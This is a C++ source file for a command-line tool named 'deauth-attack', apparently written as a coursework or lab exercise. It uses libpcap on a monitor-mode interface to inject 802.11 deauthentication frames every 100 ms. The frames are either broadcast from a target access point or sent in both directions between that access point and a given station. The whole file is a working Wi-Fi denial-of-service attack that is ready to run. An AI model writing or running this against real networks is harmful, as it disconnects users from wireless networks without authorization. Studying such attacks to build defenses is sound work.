#include <iostream>
#include <atomic>
#include <csignal>
#include <unistd.h>
#include <pcap.h>

#include "mac.h"
#include "frame.h"

static constexpr useconds_t SEND_INTERVAL_US = 100 * 1000;

static std::atomic<bool> g_running(true);

static void on_sigint(int) {
    g_running.store(false);
}

static void usage() {
    std::cout
        << "syntax : deauth-attack <interface> <ap mac> [<station mac>]\n"
        << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

int main(int argc, char* argv[]) {

    if (argc < 3 || argc > 4) {
        usage();
        return 1;
    }

    const char* ifname  = argv[1];
    Mac  apMac;
    Mac  staMac;
    bool hasStation = false;

    try {
        apMac = Mac(argv[2]);
    } catch (const std::invalid_argument&) {
        std::cerr << "AP MAC 주소 형식이 올바르지 않습니다: " << argv[2] << "\n";
        return 1;
    }

    if (argc == 4) {
        try {
            staMac = Mac(argv[3]);
        } catch (const std::invalid_argument&) {
            std::cerr << "Station MAC 주소 형식이 올바르지 않습니다: " << argv[3] << "\n";
            return 1;
        }
        hasStation = true;
    }

    Mac bcast = Mac::broadcast();

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(ifname, 65535, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "pcap_open_live 실패: " << errbuf << "\n";
        return 1;
    }

    int dlt = pcap_datalink(handle);
    if (dlt != DLT_IEEE802_11_RADIO) {
        std::cerr << "interface '" << ifname
                  << "' 는 monitor mode (radiotap) 가 아닙니다. DLT = " << dlt << "\n";
        pcap_close(handle);
        return 1;
    }

    std::signal(SIGINT,  on_sigint);
    std::signal(SIGTERM, on_sigint);

    std::cout << "[*] interface : " << ifname            << "\n"
              << "[*] ap        : " << apMac.toString()  << "\n";
    if (hasStation)
        std::cout << "[*] station   : " << staMac.toString() << "\n";
    std::cout << "[*] target    : "
              << (hasStation ? "AP unicast + STA unicast" : "AP broadcast")
              << "\n"
              << "[*] starting attack ... (Ctrl+C to stop)" << std::endl;

    uint8_t       frame[256];
    size_t        flen;
    uint16_t      seq       = 0;
    unsigned long sent_ok   = 0;
    unsigned long sent_fail = 0;

    while (g_running.load()) {

        if (!hasStation) {
            flen = build_frame(frame, bcast, apMac, apMac, seq++);
            if (flen == 0) break;
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }

        } else {
            flen = build_frame(frame, staMac, apMac, apMac, seq++);
            if (flen == 0) break;
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }

            flen = build_frame(frame, apMac, staMac, apMac, seq++);
            if (flen == 0) break;
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }
        }

        std::cout << "[+] deauth sent: ok=" << sent_ok << " fail=" << sent_fail
                  << " (last frame " << flen << " bytes)" << std::endl;

        usleep(SEND_INTERVAL_US);
    }

    std::cout << "\n[*] stopping ... total ok=" << sent_ok
              << " fail=" << sent_fail << "\n";

    pcap_close(handle);
    return 0;
}
